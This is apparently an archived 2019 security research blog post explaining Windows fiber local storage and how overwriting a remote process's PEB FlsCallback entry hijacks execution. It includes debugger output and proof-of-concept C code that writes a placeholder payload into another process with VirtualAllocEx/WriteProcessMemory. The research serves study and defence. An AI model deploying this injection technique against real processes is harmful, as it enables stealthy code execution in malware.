@@ -1,0 +1,536 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Code Execution via Fiber Local Storage - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="While working on another research project (post to be released soon, will
+update here), I stumbled onto a very Hexacorn[0] inspired type of code &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/stylesheets/data-table.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Code Execution via Fiber Local Storage</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-08-12T14:10:04-07:00" pubdate data-updated="true">Aug 12<span>th</span>, 2019</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>While working on another research project (post to be released soon, will
+update here), I stumbled onto a very Hexacorn[0] inspired type of code injection
+technique that fit my situation perfectly. Instead of tainting the other post
+with its description and code, I figured I&rsquo;d release a separate post describing
+it here.</p>
+
+<p>When I say that it&rsquo;s Hexacorn inspired, I mean that the bulk of the strategy is
+similar to everything else you&rsquo;ve probably seen; we open a handle to the remote
+process, allocate some memory, and copy our shellcode into it. At this point we
+simply need to gain control over execution flow; this is where most of
+Hexacorn&rsquo;s techniques come in handy. PROPagate via window properties,
+WordWarping via rich edit controls, DnsQuery via code pointers, etc. Another
+great example is Windows Notification Facility via user subscription callbacks
+(at least in modexp&rsquo;s proof of concept), though this one isn&rsquo;t Hexacorns.</p>
+
+<p>These strategies are also predicated on the process having certain capabilities
+(DDE, private clipboards, WNF subscriptions), but more importantly, most, if
+not all, do not work across sessions or integrity levels. This is obvious and
+expected and frankly quite niche, but in my situation, a requirement.</p>
+
+<h2>Fibers</h2>
+
+<p>Fibers are &ldquo;a unit of execution that must be manually scheduled by the
+application&rdquo;[1]. They are essentially register and stack states that can be
+swapped in and out at will, and reflect upon the thread in which they are
+executing. A single thread can be running at most a single fiber at a time, but
+fibers can be hot swapped during execution and their quantum user controlled.</p>
+
+<p>Fibers can also create and use fiber data. A pointer to this is stored in
+<code>TEB-&gt;NtTib.FiberData</code> and is a per-thread structure. This is initially set
+during a call to <code>ConvertThreadToFiber</code>. Taking a quick look at this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>void TestFiber()
+</span><span class='line'>{
+</span><span class='line'>    PVOID lpFiberData = HeapAlloc(GetProcessHeap(), 0, 0x10);
+</span><span class='line'>    PVOID lpFirstFiber = NULL;
+</span><span class='line'>    memset(lpFiberData, 0x41, 0x10);
+</span><span class='line'>
+</span><span class='line'>    lpFirstFiber = ConvertThreadToFiber(lpFiberData);
+</span><span class='line'>    DebugBreak();
+</span><span class='line'>}
+</span><span class='line'>
+</span><span class='line'>int main()
+</span><span class='line'>{
+</span><span class='line'>    DWORD tid = 0;
+</span><span class='line'>    HANDLE hThread = CreateThread(NULL, 0, (LPTHREAD_START_ROUTINE)TestFiber, 0, 0, &tid);
+</span><span class='line'>    WaitForSingleObject(hThread, INFINITE);
+</span><span class='line'>    return 0;
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>We need to spawn off the test in a new thread, as the main thread will
+always have a fiber instantiated and the call will fail. If we
+run this in a debugger we can inspect the data after the break:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:000&gt; ~
+</span><span class='line'>.  0  Id: 1674.1160 Suspend: 1 Teb: 7ffde000 Unfrozen
+</span><span class='line'>#  1  Id: 1674.c78 Suspend: 1 Teb: 7ffdd000 Unfrozen
+</span><span class='line'>0:000&gt; dt _NT_TIB 7ffdd000 FiberData
+</span><span class='line'>ucrtbased!_NT_TIB
+</span><span class='line'>   +0x010 FiberData : 0x002ea9c0 Void
+</span><span class='line'>0:000&gt; dd poi(0x002ea9c0) l5
+</span><span class='line'>002ea998  41414141 41414141 41414141 41414141
+</span><span class='line'>002ea9a8  abababab</span></code></pre></td></tr></table></div></figure>
+
+
+<p>In addition to fiber data, fibers also have access to the fiber local storage
+(FLS). For all intents and purposes, this is identical to thread local storage
+(TLS)[2]. This allows all thread fibers access to shared data via a global
+index. The API for this is pretty simple, and very similar to TLS. In the
+following sample, we&rsquo;ll allocate an index and toss some values in it. Using our
+previous example as base:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>lpFirstFiber = ConvertThreadToFiber(lpFiberData);
+</span><span class='line'>dwIdx = FlsAlloc(NULL);
+</span><span class='line'>FlsSetValue(dwIdx, lpFiberData);
+</span><span class='line'>DebugBreak();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A pointer to this data is stored in the thread&rsquo;s TEB, and can be extracted from
+<code>TEB-&gt;FlsData</code>. From the above example, assume the returned FLS index for this
+data is 6:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; ~
+</span><span class='line'>   0  Id: 15f0.a10 Suspend: 1 Teb: 7ffdf000 Unfrozen
+</span><span class='line'>.  1  Id: 15f0.c30 Suspend: 1 Teb: 7ffde000 Unfrozen
+</span><span class='line'>0:001&gt; dt _TEB 7ffde000 FlsData
+</span><span class='line'>ntdll!_TEB
+</span><span class='line'>   +0xfb4 FlsData : 0x0049a008 Void
+</span><span class='line'>0:001&gt; dd poi(0x0049a008+(4*8))
+</span><span class='line'>0049a998  41414141 41414141 41414141 41414141
+</span><span class='line'>0049a9a8  abababab</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Note that the offset is always the index + 2.</p>
+
+<h2>Abusing FLS Callbacks to Obtain Execution Control</h2>
+
+<p>Let&rsquo;s return to that <code>FlsAlloc</code> call from the above example. Its first
+parameter is a <code>PFLS_CALLBACK_FUNCTION</code>[3] and is used for, according to MSDN:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>An application-defined function. If the FLS slot is in use, FlsCallback is
+</span><span class='line'>called on fiber deletion, thread exit, and when an FLS index is freed. Specify
+</span><span class='line'>this function when calling the FlsAlloc function. The PFLS_CALLBACK_FUNCTION
+</span><span class='line'>type defines a pointer to this callback function. </span></code></pre></td></tr></table></div></figure>
+
+
+<p>Well isn&rsquo;t that lovely. These callbacks are stored process wide in
+<code>PEB-&gt;FlsCallback</code>. Let&rsquo;s try it out:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);</span></code></pre></td></tr></table></div></figure>
+
+
+<p>And fetching it (assuming again an index of 6):</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; dt _PEB 7ffd8000 FlsCallback
+</span><span class='line'>ucrtbased!_PEB
+</span><span class='line'>   +0x20c FlsCallback : 0x002d51f8 _FLS_CALLBACK_INFO
+</span><span class='line'>0:001&gt; dd 0x002d51f8 + (2 * 6 * 4) l1
+</span><span class='line'>002d5228  41414141</span></code></pre></td></tr></table></div></figure>
+
+
+<p>What happens when we let this run to process exit?</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>0:001&gt; g
+</span><span class='line'>(10a8.1328): Access violation - code c0000005 (first chance)
+</span><span class='line'>First chance exceptions are reported before any exception handling.
+</span><span class='line'>This exception may be expected and handled.
+</span><span class='line'>eax=41414141 ebx=7ffd8000 ecx=002da998 edx=002d522c esi=00000006 edi=002da028
+</span><span class='line'>eip=41414141 esp=0051f71c ebp=0051f734 iopl=0         nv up ei pl nz na po nc
+</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010202
+</span><span class='line'>41414141 ??              ???</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Recall the MSDN comment about <em>when</em> the FLS callback is invoked: <code>..on fiber
+deletion, thread exit, and when an FLS index is freed</code>. This means that worst
+case our code executes once the process exits and best case following a
+threads exit or call to <code>FlsFree</code>. It&rsquo;s worth reiterating that the primary
+thread for each process will have a fiber instantiated already; it&rsquo;s quite
+possible that this thread isn&rsquo;t around anymore, but this doesn&rsquo;t matter as the
+callbacks are at the process level.</p>
+
+<p>Another salient point here is the first parameter to the callback function.
+This parameter is the value of whatever was in the indexed slot and is also
+stashed in ECX/RCX before invoking the callback:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>dwIdx = FlsAlloc((PFLS_CALLBACK_FUNCTION)0x41414141);
+</span><span class='line'>FlsSetValue(dwIdx, (PVOID)0x42424242);
+</span><span class='line'>DebugBreak();</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Which, when executed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>(aa8.169c): Access violation - code c0000005 (first chance)
+</span><span class='line'>First chance exceptions are reported before any exception handling.
+</span><span class='line'>This exception may be expected and handled.
+</span><span class='line'>eax=41414141 ebx=7ffd9000 ecx=42424242 edx=003c522c esi=00000006 edi=003ca028
+</span><span class='line'>eip=41414141 esp=006ef9c0 ebp=006ef9d8 iopl=0         nv up ei pl nz na pe nc
+</span><span class='line'>cs=001b  ss=0023  ds=0023  es=0023  fs=003b  gs=0000             efl=00010206
+</span><span class='line'>41414141 ??              ???</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Under specific circumstances, this can be quite useful.</p>
+
+<p>Anyway, PoC||GTFO, I&rsquo;ve included some code below. In it, we overwrite the
+<code>msvcrt!_freefls</code> call used to free the FLS buffer.</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>#ifdef _WIN64
+</span><span class='line'>#define FlsCallbackOffset 0x320
+</span><span class='line'>#else
+</span><span class='line'>#define FlsCallbackOffset 0x20c
+</span><span class='line'>#endif
+</span><span class='line'>
+</span><span class='line'>void OverwriteFlsCallback(LPVOID dwNewAddr, HANDLE hProcess) 
+</span><span class='line'>{
+</span><span class='line'>    _NtQueryInformationProcess NtQueryInformationProcess = (_NtQueryInformationProcess)GetProcAddress(GetModuleHandleA("ntdll"), 
+</span><span class='line'>                                                            "NtQueryInformationProcess");
+</span><span class='line'>    const char *payload = "\xcc\xcc\xcc\xcc";
+</span><span class='line'>    PROCESS_BASIC_INFORMATION pbi;
+</span><span class='line'>    SIZE_T sCallback = 0, sRetLen = 0;
+</span><span class='line'>    LPVOID lpBuf = NULL;
+</span><span class='line'>
+</span><span class='line'>    //
+</span><span class='line'>    // allocate memory and write in our payload as one would normally do
+</span><span class='line'>    //
+</span><span class='line'>
+</span><span class='line'>    lpBuf = VirtualAllocEx(hProcess, NULL, sizeof(SIZE_T), MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+</span><span class='line'>    WriteProcessMemory(hProcess, lpBuf, payload, sizeof(SIZE_T), NULL);
+</span><span class='line'>
+</span><span class='line'>    // now we need to fetch the remote process PEB
+</span><span class='line'>    NtQueryInformationProcess(hProcess, PROCESSINFOCLASS(0), &pbi,
+</span><span class='line'>                              sizeof(PROCESS_BASIC_INFORMATION), NULL);
+</span><span class='line'>
+</span><span class='line'>    // read the FlsCallback address out of it
+</span><span class='line'>    ReadProcessMemory(hProcess, (LPVOID)(((SIZE_T)pbi.PebBaseAddress) + FlsCallbackOffset), 
+</span><span class='line'>                          (LPVOID)&sCallback, sizeof(SIZE_T), &sRetLen);
+</span><span class='line'>    sCallback += 2 * sizeof(SIZE_T);
+</span><span class='line'>
+</span><span class='line'>    // we're targeting the _freefls call, so overwrite that with our payload
+</span><span class='line'>    // address 
+</span><span class='line'>    WriteProcessMemory(hProcess, (LPVOID)sCallback, &dwNewAddr, sizeof(SIZE_T), &sRetLen);
+</span><span class='line'>}</span></code></pre></td></tr></table></div></figure>
+
+
+<p>I tested this on an updated Windows 10 x64 against notepad and mspaint; on
+process exit, the callback is executed and we gain control over execution flow.
+Pretty useful in the end; more on this soon&hellip;</p>
+
+<h2>References</h2>
+
+<p>[0] <a href="http://www.hexacorn.com/%0A">http://www.hexacorn.com/
+</a>[1] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/fibers%0A">https://docs.microsoft.com/en-us/windows/win32/procthread/fibers
+</a>[2] <a href="https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage%0A">https://docs.microsoft.com/en-us/windows/win32/procthread/thread-local-storage
+</a>[3] <a href="https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function\">https://docs.microsoft.com/en-us/windows/win32/api/winnt/nc-winnt-pfls_callback_function\</a></p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2019-08-12T14:10:04-07:00" pubdate data-updated="true">Aug 12<span>th</span>, 2019</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/code-injection/'>code injection</a>, <a class='category' href='/blog/categories/windows/'>windows</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage/" data-via="" data-counturl="http://hatRiot.github.io/blog/2019/08/12/code-execution-via-fiber-local-storage/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2018/08/22/dell-digital-delivery-eop/" title="Previous Post: Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation">&laquo; Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation</a>
+      
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2019/08/12/code-execution-via-fiber-local-storage/">Code Execution via Fiber Local Storage</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/08/22/dell-digital-delivery-eop/">Dell Digital Delivery - CVE-2018-11072 - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/01/abusing-token-privileges-for-eop/">Abusing Token Privileges for EoP</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2019 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
